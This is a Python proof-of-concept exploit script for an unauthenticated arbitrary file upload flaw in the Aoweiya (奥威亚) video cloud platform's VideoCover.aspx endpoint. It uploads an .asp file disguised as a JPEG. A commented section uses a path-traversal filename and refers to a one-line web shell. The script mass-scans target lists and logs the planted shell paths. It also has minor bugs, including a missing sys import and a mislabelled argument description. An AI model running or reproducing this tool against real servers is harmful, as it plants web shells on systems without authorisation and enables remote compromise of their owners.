# -*- coding: utf-8 -*-
import time
import requests
import urllib3
from rich.console import Console
import argparse
import re
import multiprocessing
from multiprocessing.dummy import Pool

console = Console()
def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())


def banner():
    test = """
8b        d8   88           88      a8P  88 888b      88   ,ad8888ba,   
 Y8,    ,8P  ,d88           88    ,88' ,d88 8888b     88  d8"'    `"8b  
  Y8,  ,8P 888888           88  ,88" 888888 88 `8b    88 d8'            
   "8aa8"      88           88,d88'      88 88  `8b   88 88             
    `88'       88           8888"88,     88 88   `8b  88 88      88888  
     88        88           88P   Y8b    88 88    `8b 88 Y8,        88  
     88        88           88     "88,  88 88     `8888  Y8a.    .a88  
     88        88           88       Y8b 88 88      `888   `"Y88888P"   
                                                                        
                 888888888888                                          
                                     
             tag:  this is a 奥威亚视屏云平台VideoCover前台任意文件上传  poc                                       
                                     @version: 1.0.0   @author: Y1_K1NG           
"""
    print(test)


def poc(target):
    if target[:4] != 'http':
        target = 'http://' + target
    if target[-1] != '/':
        target += '/'
    headers = {
        "Cache-Control": "no-cache",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 1015 7) AppleWebKit/537.36(KHTML, like Gecko) Chrome/107.0.0.0 Safari 537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avifimage/webp,image/apng,*/*;q=0.8,application/signed-exchangev=b3;q=0.9",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;g=0.9",
        "Connection": "close",
        "Pragma": "no-cache",
        # "Content-Type": "multipart/form-data; boundary=68c4ca658cd4332dc386f53710e63a10"

    }
    # data = """
    #     --68c4ca658cd4332dc386f53710e63a10
    #     Content-Disposition: form-data; name="file"; filename="/../../../AVA.ResourcesPlatform.WebUI/y1.asp"
    #     Content-Type: image/jpeg
    #
    #     yijuhuamuma
    #     --68c4ca658cd4332dc386f53710e63a10--
    # """
    files = {'file': ("y1.asp", open('y1.asp', 'rb'), 'image/jpeg')}

    url = target + "/Tools/Video/VideoCover.aspx"
    response = requests.post(url, headers=headers, files=files, verify=False, timeout=5)
    # print(response.request.headers)
    # print(response.request.body)
    try:
        response = requests.post(url, headers=headers, files=files, verify=False, timeout=5)
        match = re.search(r"Success", response.text)
        if match:
            if response.status_code == 200:
                print(f"[+]{target} is valuable")
                with open("result.txt", "a+", encoding="utf-8") as f:
                    f.write(target + "y1.asp" + "\n")
            else:
                print(f"[!]{target} response code is not 200")
        else:
            print(f"[!]{target} doesn't have vulnerable")
    except:
        print(f"[*] {target} error")


def main():
    banner()
    parser = argparse.ArgumentParser(description='canal admin weak Password')
    parser.add_argument("-u", "--url", dest="url", type=str, help=" example: www.example.com")
    parser.add_argument("-f", "--file", dest="file", type=str, help=" urls.txt")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, "r", encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n", ""))

        mp = Pool(10)  # 创建一个拥有20个线程的线程池
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


if __name__ == '__main__':
    main()

